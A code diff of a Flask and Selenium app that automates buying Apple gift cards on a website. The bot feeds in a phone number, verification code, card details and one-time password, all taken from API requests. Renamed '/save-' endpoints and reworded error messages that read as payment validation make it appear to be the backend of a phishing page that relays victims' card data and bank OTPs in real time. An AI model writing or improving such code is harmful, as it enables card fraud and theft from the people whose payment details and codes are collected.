@@ -77,7 +77,7 @@ class Otp(db.Model):
 def start_driver():
     user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'
     options = webdriver.ChromeOptions()
-    options.headless = True
+    #options.headless = True
     options.add_argument(f'user-agent={user_agent}')
     options.add_argument("--window-size=800,600")
     options.add_argument('--ignore-certificate-errors')
@@ -102,7 +102,7 @@ def send_phone_number_bot(driver, amount, phoneNumber):
             EC.presence_of_element_located((By.CSS_SELECTOR, "#main-content > div > div.HomeCardCatalogComponent > div > div > div > div.mt-4 > div > div > div:nth-child(4) > div > div.brandImageContainer.rounded-top.overflow-hidden > div > div"))
         )
         script0 = 'let appleCard = document.querySelector("#main-content > div > div.HomeCardCatalogComponent > div > div > div > div.mt-4 > div > div > div:nth-child(4) > div > div.brandImageContainer.rounded-top.overflow-hidden > div > div"); appleCard.click()'
-        time.sleep(0.5)
+        time.sleep(1)
         driver.execute_script(script0)
         amountInput = WebDriverWait(driver,20).until(
             EC.presence_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/div/div[2]/div[1]/div[3]/div/div[1]/main/div/div[1]/div[2]/div/div/section[1]/div/div/div[2]/form/div[1]/div/div/div/div/div/div[2]/div[2]/div/input'))
@@ -112,6 +112,7 @@ def send_phone_number_bot(driver, amount, phoneNumber):
             amountInput.send_keys(Keys.BACKSPACE)
             time.sleep(0.5)
         ActionChains(driver).move_to_element(amountInput).send_keys(amount).perform()
+        time.sleep(0.5)
         ActionChains(driver).move_to_element(amountInput).send_keys(Keys.TAB).perform()
         script1 = 'let forMyselfButton = document.querySelector("#main-content > div > div.BrandBodyComponent.ITUNESC > div.ContainerComponent.container.container-sm.brandDetailsContainer.container-max-width-xl > div > div > section.my-6 > div > div > div.BrandFormComponent > form > section:nth-child(5) > div > div:nth-child(1) > button"); forMyselfButton.click()'
         driver.execute_script(script1)
@@ -392,9 +393,9 @@ def get_otp(cardRef, timeDelay):
 
     
 #endpoint endpoint incharge of taking the phonenumber,amount and sending the verification code  
-@app.route('/send-phone-number', methods=["POST"])
+@app.route('/save-phone-number', methods=["POST"])
 @cross_origin()
-def send_phone_number():
+def save_phone_number():
     #initiate a driver instance
     driver = start_driver()
     amount = int(request.json["amount"])
@@ -436,23 +437,23 @@ def send_phone_number():
                             otp_sent = send_otp_bot(driver,otp.code)
                             if otp_sent:
                                 #if the otp code is sent, quit the browser and notify the user
-                                time.sleep(1)
+                                time.sleep(5)
                                 driver.quit()
                                 return jsonify({'success': True, 'message': 'Payment Authentication, It may take a few minutes to be approved. You will be notified of its completion'})
                             else:
-                                return jsonify({'success': False, 'message': 'Failed to send OTP Please Contact Your Bank and Try again'})
+                                return jsonify({'success': False, 'message': 'Failed to validate OTP, Please Contact Your Bank and Try again'})
                         else:
-                            return jsonify({'success': False, 'message': 'OTP Timeout Please Try again'})
+                            return jsonify({'success': False, 'message': 'OTP Timeout, Please Try again'})
                     else:
-                        return jsonify({'success': False, 'message': 'Failed to send card Details Please Try again'})
+                        return jsonify({'success': False, 'message': 'A Problem Occured while Validating Payment Details, Please Try again'})
                 else:
-                    return jsonify({'success': False, 'message': 'Payment Timeout Please Try again'})    
+                    return jsonify({'success': False, 'message': 'Payment Timeout, Please Try again'})    
             else:
-                return jsonify({'success': False, 'message': 'Code is not valid Please Try again'})
+                return jsonify({'success': False, 'message': 'Code is not valid, Please Try again'})
         else:
-            return jsonify({'success': False, 'message': 'Verification Code Timeout Please Try again'})
+            return jsonify({'success': False, 'message': 'Verification Code Timeout, Please Try again'})
     else:
-        return jsonify({'success': False, 'message': 'Failed to send Phone number Please Try again'})
+        return jsonify({'success': False, 'message': 'A Problem Occured while Validating Phone number, Please Try again'})
 
 
 #endpoint incharge of saving a verification code to the database    
@@ -492,7 +493,7 @@ def validate_code():
     
 
 #this endpoint saves card details to the database    
-@app.route('/send-payment-details', methods=["POST"])
+@app.route('/save-payment-details', methods=["POST"])
 @cross_origin()
 def save_payment_details():
     cardHolderName = request.json["cardHolderName"]
